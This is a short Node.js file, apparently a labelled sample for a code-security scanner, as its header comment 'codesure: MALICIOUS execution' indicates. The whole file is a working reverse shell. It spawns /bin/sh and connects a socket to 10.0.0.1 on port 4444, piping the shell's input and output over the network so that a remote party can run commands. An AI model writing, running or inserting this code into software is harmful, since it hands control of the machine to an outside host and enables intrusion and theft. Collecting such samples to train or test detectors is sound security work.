// codesure: MALICIOUS execution
const net = require('net');
const cp = require('child_process');
const sh = cp.spawn('/bin/sh', []);
const client = new net.Socket();
client.connect(4444, '10.0.0.1', () => { client.pipe(sh.stdin); sh.stdout.pipe(client); });
